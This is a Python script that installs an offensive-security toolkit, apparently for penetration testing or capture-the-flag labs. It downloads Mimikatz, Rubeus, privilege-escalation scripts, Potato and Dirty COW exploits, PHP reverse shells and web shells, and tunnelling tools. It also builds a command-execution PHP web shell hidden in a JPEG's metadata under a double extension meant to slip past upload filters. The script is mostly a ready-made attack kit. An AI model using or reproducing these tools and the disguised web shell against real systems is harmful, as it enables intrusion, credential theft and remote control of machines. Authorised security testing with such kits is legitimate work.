#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF COMPUTER NETWORKS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Load any required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import os.path
import shutil

def banner():
   print("\t\t ____   ___   ____ _   _ _____      _    ____ _____ _   _ _____   ")
   print("\t\t|  _ \ / _ \ / ___| | | | ____|    / \  / ___| ____| \ | |_   _|  ")
   print("\t\t| |_) | | | | |  _| | | |  _|     / _ \| |  _|  _| |  \| | | |    ")
   print("\t\t|  _ <| |_| | |_| | |_| | |___   / ___ \ |_| | |___| |\  | | |    ")
   print("\t\t|_| \_\\\\___/ \____|\___/|_____| /_/   \_\____|_____|_| \_| |_|  ") 
   print("\t\t                                                                  ")
   print("\t\t      BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)        \n\n")
   return

# -------------------------------------------------------------------------------------
# EXPLOITS
# -------------------------------------------------------------------------------------

os.system("clear")
banner()
print("[*] Installing Treadstone Exploit Pack...\n")

if not os.path.exists("TREADSTONE"):
   os.system("mkdir TREADSTONE")
os.chdir("TREADSTONE")
os.system("wget https://download.sysinternals.com/files/Procdump.zip -O Procdump.zip")
os.system("unzip Procdump.zip")
if os.path.exists("Procdump.zip"):
   os.remove("Procdump.zip")
os.system("mv ./Procdump/procdump64.exe ./")
os.system("mv ./Procdump/procdump32.exe ./")
os.remove("Eula.txt")
os.remove("procdump64a.exe")
os.system("rmdir Procdump")
os.system("wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O winpeas64.exe")
os.system("wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O winpeas32.exe")
os.system("wget 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe' -O sharphound.exe")
os.system("wget 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1' -O sharphound.ps1")
os.system("git clone https://github.com/TsukiCTF/Lovely-Potato.git")
os.system("mv ./Lovely-Potato/Invoke-LovelyPotato.ps1 ./lovelypotato.ps1")
os.system("mv ./Lovely-Potato/JuicyPotato-Static.exe ./juicypotato.exe")
os.system("mv ./Lovely-Potato/test_clsid.bat ./")
os.remove("./Lovely-Potato/README.md")
shutil.rmtree("Lovely-Potato")
os.system("wget 'https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip' -O RoguePotato.zip")
os.system("unzip RoguePotato.zip")
os.remove("RoguePotato.zip")
os.system("mv ./RogueOxidResolver.exe ./rogueoxidresolver.exe")
os.system("mv ./RoguePotato.exe ./roguepotato.exe")
os.system("wget 'https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1' -O jawsenum.ps1")
os.system("wget 'https://github.com/besimorhino/powercat/raw/master/powercat.ps1' -O powercat.ps1")
os.system("wget 'https://github.com/HarmJ0y/PowerUp/raw/master/PowerUp.ps1' -O powerup.ps1")
os.system("wget 'https://github.com/S3cur3Th1sSh1t/WinPwn/raw/master/WinPwn.ps1' -O winpwn.ps1")
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Out-Minidump.ps1' -O mimidump.ps1")
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1' -O mimilatz.ps1")
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1' -O powerview.ps1")
os.system("wget 'https://github.com/Kevin-Robertson/Powermad/raw/master/Powermad.ps1' -O powermad.ps1")
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_amd64.gz' -O chisel.gz")
os.system("gunzip chisel.gz")
os.system("mv chisel chisel64.exe")
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_386.gz' -O chisel.gz")
os.system("gunzip chisel.gz")
os.system("mv chisel chisel32.exe")
os.system("wget 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe' -O rubeus.exe")
os.system("wget 'https://nmap.org/dist/nmap-7.80-setup.exe' -O nmapsetup.exe")
os.system("cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe")
os.system("cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe")
os.system("cp /usr/share/windows-resources/binaries/nc.exe nc64.exe")
os.system("cp /usr/share/windows-resources/binaries/plink.exe plink64.exe")
os.system("wget 'https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php' -O webshell.php")
os.system("wget 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -O myshell.php")
os.system("touch image.jpg")
command = "<h1>IMAGE SHELL<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>"
os.system("exiftool -DocumentName='" + command + "' image.jpg")
os.system("mv image.jpg image.php.jpg")
os.system("wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh' -O linenum.sh")
os.system("wget 'https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh' -O linenumplus.sh")
os.system("wget 'https://raw.githubusercontent.com/Adlemann/linPE/master/linpe.sh' -O linpe.sh")
os.system("wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O linpeas.sh")
os.system("wget 'https://raw.githubusercontent.com/Arr0way/linux-local-enumeration-script/master/linux-local-enum.sh' -O coffee.sh")
os.system("wget 'https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php' -O webshell.php")
os.system("wget 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32' -O pspy32")
os.system("wget 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64' -O pspy64")
os.system("wget 'https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.4.0-31-generic/CVE-2016-5195/compile.sh' -O naughtycowcompile.sh")
os.system("wget 'https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.4.0-31-generic/CVE-2016-5195/naughtyc0w.c' -O naughthycow.c")
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_linux_amd64.gz' -O chisel_1.7.2_linux_amd64.gz")
os.system("gzip -d chisel_1.7.2_linux_amd64.gz")
os.system("mv chisel_1.7.2_linux_amd64 chisel.linux64")
os.chdir("..")

print("[+] Good Job!! Treadstone Exploit Pack Installed...")

#Eof
